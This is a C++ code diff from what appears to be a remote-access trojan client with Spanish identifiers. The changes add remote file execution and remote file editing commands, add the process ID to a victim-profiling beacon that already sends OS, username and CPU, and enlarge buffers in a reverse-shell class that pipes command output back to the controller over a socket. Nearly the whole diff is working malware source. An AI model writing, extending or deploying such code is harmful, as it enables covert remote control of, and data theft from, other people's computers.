@@ -245,7 +245,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strCommand.append(1, '\\');
             strCommand.append(item);
             this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
-            Sleep(10);
+            Sleep(30);
             //std::cout << strCommand << std::endl;
         }
         return;
@@ -257,13 +257,11 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         return;
     }
 
-    //Crear archivo
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Archivo) {
         CrearArchivo(strIn[1].c_str());
         return;
     }
 
-    //Borrar archivo
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Borrar_Archivo) {
         BorrarArchivo(strIn[1].c_str());
         return;
@@ -276,6 +274,33 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         std::thread th(&EnviarArchivo, param1, param2, this);
         th.detach();
         return;
+    }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
+        bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
+#ifdef ___DEBUG_
+        if(isOK){
+            std::cout<<strIn[1]<<" - ejecutado"<<std::endl;
+        } else {
+            std::cout<<"[X] Error ejecutando "<<strIn[1]<<std::endl;
+            error();
+        }
+#endif
+        return;
+    }
+
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo){
+        EditarArchivo(strIn[1], strIn[2], this);
+        return;
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo_Guardar) {
+        int iHeader = strIn[0].size() + strIn[1].size() + 2;
+        char* cBytes = pBuffer + iHeader;
+        std::string strBuffer = std::string(cBytes);
+
+        EditarArchivo_Guardar(strIn[1], strBuffer.c_str(), static_cast<std::streamsize>(iSize) - iHeader);
+
     }
     //#####################################################
     //#####################################################
@@ -369,6 +394,8 @@ void Cliente::iniPacket() {
     strOut += strOS();
     strOut.append(1, '\\');
     strOut += strUserName();
+    strOut.append(1, '\\');
+    strOut += std::to_string(GetCurrentProcessId());
     strOut.append(1, '\\');
     strOut += strCpu();
     
@@ -652,7 +679,7 @@ void ReverseShell::TerminarShell() {
 
 void ReverseShell::thLeerShell(HANDLE hPipe) {
     //int iLen = 0; , iRet = 0;
-    char cBuffer[256], cBuffer2[256 * 2 + 30];
+    char cBuffer[4096], cBuffer2[4096 * 2 + 30];
     DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
     BYTE bPChar = 0;
     while (this->isRunning) {
@@ -674,7 +701,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
             strOut.append(1, '\\');
             strOut += cBuffer2;
-
+        
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
             Sleep(10);
             if (iEnviado <= 0) {
